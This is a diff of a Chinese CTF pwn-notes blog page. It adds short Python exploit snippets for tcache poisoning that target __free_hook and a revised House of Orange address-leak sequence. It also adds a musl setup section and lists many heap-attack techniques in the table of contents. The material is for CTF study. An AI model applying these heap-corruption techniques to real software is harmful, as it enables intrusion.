+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span> <span class="n">new</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># chunk 0-9</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span> <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c1"># chunk 0-6 进入 tcache bin</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># free chunk8进入unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1"># free chunk7, 与chunk8合并为chunk7</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># tcache 取出 chunk0</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># chunk8 进入 tcache bin，此时chunk8在chunk7之间</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">)</span> <span class="c1"># 申请chunk7可以编辑chunk8的fd</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x210</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]))</span> <span class="c1"># chunk8指向target</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># chunk8</span>
+</span></span><span class="line"><span class="cl"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span> <span class="c1"># target劫持</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="/img/pwn_note.zh-cn.assets/image-20241128190118374.png" alt="image-20241128190118374" style="zoom: 80%;" />
 <h4 id="house-of-orange">House of orange</h4>
 <ul>
 <li>glibc-2.23~2.26，无<code>free</code>函数，仅仅存在堆溢出，可以<code>unsorted bin attack</code></li>
@@ -9628,20 +10435,26 @@
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// 调用链 malloc &gt; sysmalloc &gt; _int_free
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">_int_free</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">old_top</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// 通过此将top chunk free
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">b</span><span class="err">&#39;&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">xxx</span><span class="p">)</span> <span class="err">#</span> <span class="err">修改</span><span class="n">top</span> <span class="n">chunk</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="n">b</span><span class="err">&#39;&#39;</span><span class="p">)</span> <span class="err">#</span> <span class="n">top</span> <span class="n">chunk</span> <span class="err">进入</span> <span class="n">unsorted</span> <span class="n">bin</span>
-</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span> <span class="n">b</span><span class="err">&#39;&#39;</span><span class="p">)</span> <span class="err">#</span> <span class="err">从</span> <span class="n">unsorted</span> <span class="n">bin</span> <span class="err">获取堆块</span>
-</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">()</span> <span class="err">#</span> <span class="err">泄露地址</span>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">xxx</span><span class="p">)</span> <span class="c1"># 修改top chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="c1"># top chunk 进入 unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span> <span class="c1"># 从 unsorted bin 获取堆块</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">()</span> <span class="c1"># 泄露地址</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="house-of-spirit">House of spirit</h4>
@@ -9905,7 +10718,23 @@
 	
 	
 ></p>
-
+<h2 id="musl-pwn">musl pwn</h2>
+<h3 id="环境">环境</h3>
+<p>下载<a class="link" href="https://pkgs.org/download/musl"  target="_blank" rel="noopener"
+    >安装包</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo dpkg -i musl_1.1.xx-x_amd64.deb <span class="c1"># 同样适用于Libc调试符号musl-dbgsymxxx.ddeb</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># https://launchpad.net/ubuntu/</span>
+</span></span><span class="line"><span class="cl">sudo apt-get install -y musl musl-dev
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
@@ -10119,7 +10948,7 @@
         
             
         
-        共 155.07k 字 · 共 19篇文章
+        共 159.79k 字 · 共 19篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -10329,6 +11158,7 @@
         <li><a href="#ropper">ropper</a></li>
         <li><a href="#ida">IDA</a></li>
         <li><a href="#pwntools">pwntools</a></li>
+        <li><a href="#gdb">gdb</a></li>
         <li><a href="#pwndbg">pwndbg</a></li>
         <li><a href="#pwngdb">Pwngdb</a></li>
         <li><a href="#gdb-dashboard">gdb-dashboard</a></li>
@@ -10338,6 +11168,8 @@
         <li><a href="#git">git</a></li>
         <li><a href="#linux">Linux</a></li>
         <li><a href="#makefile">Makefile</a></li>
+        <li><a href="#libc-database">libc-database</a></li>
+        <li><a href="#debuginfod">debuginfod</a></li>
       </ol>
     </li>
     <li><a href="#基础知识">基础知识</a>
@@ -10379,10 +11211,10 @@
       </ol>
     </li>
     <li><a href="#整数溢出漏洞">整数溢出漏洞</a></li>
-    <li><a href="#oob漏洞">OOB漏洞</a></li>
     <li><a href="#栈溢出漏洞">栈溢出漏洞</a>
       <ol>
         <li><a href="#栈基础">栈基础</a></li>
+        <li><a href="#oob">OOB</a></li>
         <li><a href="#地址泄露">地址泄露</a></li>
         <li><a href="#ret2text">ret2text</a></li>
         <li><a href="#ret2shellcode">ret2shellcode</a></li>
@@ -10418,6 +11250,7 @@
       <ol>
         <li><a href="#栈迁移">栈迁移</a></li>
         <li><a href="#srop">SROP</a></li>
+        <li><a href="#exit-hook">Exit Hook</a></li>
       </ol>
     </li>
     <li><a href="#格式化字符串">格式化字符串</a>
@@ -10427,7 +11260,6 @@
         <li><a href="#非栈上fmt">非栈上fmt</a></li>
       </ol>
     </li>
-    <li><a href="#exit-hook">exit hook</a></li>
     <li><a href="#堆溢出漏洞">堆溢出漏洞</a>
       <ol>
         <li><a href="#堆管理器">堆管理器</a>
@@ -10437,31 +11269,49 @@
             <li><a href="#bin">bin</a></li>
           </ol>
         </li>
-        <li><a href="#unlink">Unlink</a></li>
-        <li><a href="#uaf">UAF</a></li>
-        <li><a href="#double-free">Double free</a></li>
+        <li><a href="#漏洞点">漏洞点</a>
+          <ol>
+            <li><a href="#unlink">Unlink</a></li>
+            <li><a href="#uaf">UAF</a></li>
+            <li><a href="#off-by-null">Off-by-null</a></li>
+          </ol>
+        </li>
+        <li><a href="#堆叠">堆叠</a></li>
         <li><a href="#fast-bin-attack">fast bin attack</a>
           <ol>
+            <li><a href="#double-free">Double Free</a></li>
             <li><a href="#arbitrary-alloc">Arbitrary Alloc</a></li>
           </ol>
         </li>
         <li><a href="#tcache-bin-attack">Tcache bin attack</a>
           <ol>
-            <li><a href="#safe-linking机制">Safe-linking机制</a></li>
-            <li><a href="#double-free-1">Double free</a></li>
+            <li><a href="#tcache-bypass">Tcache Bypass</a></li>
+            <li><a href="#tcache-poisoning">Tcache Poisoning</a></li>
+            <li><a href="#tcache-dup">Tcache Dup</a></li>
+            <li><a href="#tcache-extend">Tcache Extend</a></li>
+            <li><a href="#tcache-key-bypass">Tcache key Bypass</a></li>
+            <li><a href="#fastbin-reverse">Fastbin Reverse</a></li>
+            <li><a href="#tcache-stash-unlink">Tcache Stash Unlink</a></li>
+            <li><a href="#safe-linking-bypass">Safe-linking Bypass</a></li>
           </ol>
         </li>
         <li><a href="#large-bin-attack">Large bin attack</a>
           <ol>
+            <li><a href="#地址泄露-1">地址泄露</a></li>
+            <li><a href="#目标地址写大数">目标地址写大数</a></li>
             <li><a href="#mp_-struct-attack">mp_ struct attack</a></li>
           </ol>
         </li>
-        <li><a href="#unsorted-bin-attack">Unsorted bin attack</a></li>
-        <li><a href="#off-by-one">Off-by-one</a></li>
-        <li><a href="#off-by-null">Off-by-null</a></li>
+        <li><a href="#unsorted-bin-attack">Unsorted bin attack</a>
+          <ol>
+            <li><a href="#地址泄露-2">地址泄露</a></li>
+            <li><a href="#任意地址写大数">任意地址写大数</a></li>
+          </ol>
+        </li>
         <li><a href="#house-of">House of</a>
           <ol>
-            <li><a href="#house-of-strom">House of strom</a></li>
+            <li><a href="#house-of-kauri">House of kauri</a></li>
+            <li><a href="#house-of-botcake">House of Botcake</a></li>
             <li><a href="#house-of-orange">House of orange</a></li>
             <li><a href="#house-of-spirit">House of spirit</a></li>
           </ol>
@@ -10476,6 +11326,11 @@
     <li><a href="#条件竞争">条件竞争</a>
       <ol>
         <li><a href="#double-fetch">Double Fetch</a></li>
+      </ol>
+    </li>
+    <li><a href="#musl-pwn">musl pwn</a>
+      <ol>
+        <li><a href="#环境">环境</a></li>
       </ol>
     </li>
   </ol>
